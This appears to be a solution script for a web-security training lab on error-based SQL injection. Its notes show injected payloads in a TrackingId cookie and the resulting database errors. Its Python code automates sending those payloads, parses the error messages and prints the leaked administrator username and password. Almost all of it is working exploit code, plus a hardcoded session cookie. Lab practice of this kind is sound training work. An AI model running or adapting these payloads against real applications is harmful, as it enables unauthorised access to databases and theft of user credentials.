"""
CAST() is used to convert one datatype into another datatype in SQL.

' error triggered
'-- ent
' AND CAST((SELECT 1) as int)-- error triggered
' AND 1=CAST((SELECT 1) as int)-- ent 

' AND 1=CAST((SELECT username FROM users) AS int)--

Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'zu1sbcIERm7yclmr' AND 1=CAST((SELECT username from users) as'. Expected  char</h4>
                    <p class=is-warning>Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'zu1sbcIERm7yclmr' AND 1=CAST((SELECT username from users) as'. Expected  char


                    to free up space remove the tracking id let it be empty to fitin character

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
this gives us the error 
ERROR: invalid input syntax for type integer: "administrator"
which confirms that the first username in the users table is administrator

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

                   </header>
                    <h4>ERROR: invalid input syntax for type integer: "qka1ql0rawygagv34y1c"</h4>
                    <p class=is-warning>ERROR: invalid input syntax for type integer: "qka1ql0rawygagv34y1c"</p>
                </div>
"""

import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def confirm_username(url, session_cookie):
    payload = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"

    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    response = requests.get(url, cookies=cookies, verify=False)

    if "administrator" in response.text:
        print("[+] Confirmed first username is administrator")
        return True

    match = re.search(r'invalid input syntax for type integer: \"(.*?)\"', response.text)

    if match:
        leaked = match.group(1)
        print(f"[+] Database leaked username: {leaked}")

        if leaked == "administrator":
            print("[+] Confirmed administrator user exists")
            return True

    print("[-] Could not confirm administrator")
    return False


def extract_password(url, session_cookie):
    payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"

    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    response = requests.get(url, cookies=cookies, verify=False)

    match = re.search(r'invalid input syntax for type integer: \"(.*?)\"', response.text)

    if match:
        password = match.group(1)
        print(f"[+] Administrator password: {password}")
        return password

    print("[-] Password extraction failed")
    return None


if __name__ == "__main__":

    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1]

    SESSION_COOKIE = "Xu7oyLlrtxIdtz3HY1OhSGI9yU7jdfMC"

    print("[+] Verifying first user...")

    if confirm_username(url, SESSION_COOKIE):
        print("[+] Extracting administrator password...")
        extract_password(url, SESSION_COOKIE)
